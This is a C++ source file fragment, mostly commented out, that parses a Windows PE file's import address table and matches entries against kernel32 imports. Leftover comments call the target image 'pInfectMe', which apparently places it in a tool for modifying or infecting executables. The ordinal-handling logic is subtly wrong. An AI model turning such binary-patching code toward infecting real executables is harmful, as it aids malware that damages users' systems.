/**
 *	PEASM Import Address Table
 **/

#include <Windows.h>
#include <iostream>
#include <list>

#include "types.h"
/*
typedef struct _IMPORT_SYMBOL
{
	bool		ImportByOrdinal;	// If TRUE lpProcName is NULL
	const char	*lpProcName;	// pointer to function or variable name
	DWORD		dwProcOrdinal;	// ordinal (0 if lpProcName isn't NULL)
	LPVOID		lpIATRVA;		// ?
	DWORD		dwImportAddressTable;	//	Pointer to DWORD in address table
} IMPORT_SYMBOL;

bool operator == (const IMPORT_SYMBOL &first, const IMPORT_SYMBOL &second);

typedef std::list<IMPORT_SYMBOL>::iterator IMPORT_SYMBOL_ITERATOR;
typedef std::list<IMPORT_SYMBOL> IMPORT_SYMBOL_ARRAY;

typedef struct _IMPORT_LIB
{
	const char	*szModuleName;
	IMPORT_SYMBOL_ARRAY functions;
} IMPORT_LIBRARY;


PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pTarget->RawPointer(DataDir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	while(pImportDescriptor->Characteristics != 0)
	{
		//std::cout << "Name " << (char *) pInfectMe->RawPointer(pImportDescriptor->Name) << std::endl;
		
		//std::cout << "\tEntries: " << std::endl;
		PULONG rvaName = (PULONG) pTarget->RawPointer(pImportDescriptor->Characteristics);
		PULONG iatRVA = (PULONG) pTarget->RawPointer(pImportDescriptor->FirstThunk);
		PULONG iat = (PULONG) pImportDescriptor->FirstThunk;

		while(*rvaName != 0)
		{
			char *name = (char *) pTarget->RawPointer((*rvaName & 0x7fffffff) + 2);

			if (name != NULL)
			{
				//std::cout << "\t " << std::hex << CALC_DISP(LPVOID, iatRVA, pInfectMe) << " " << std::hex << *iatRVA << " " << name << std::endl;

				compare_iat_value(kernel32_iat, sizeof(kernel32_iat) / sizeof(struct _IAT_ENTRY), name, iat);
			}
			else
			{	// by ordinal
				//LPDWORD sticazzi = (LPDWORD) pInfectMe->RawPointer((*rvaName & 0x7fffffff) + 2);
				//std::cout << "\t [ORDINAL] " << std::hex << CALC_DISP(LPVOID, iatRVA, pInfectMe) << " " << std::hex << *x << " " << std::endl;
			}

			rvaName++;
			iatRVA++;
			iat++;
		}

		pImportDescriptor++;
	}*/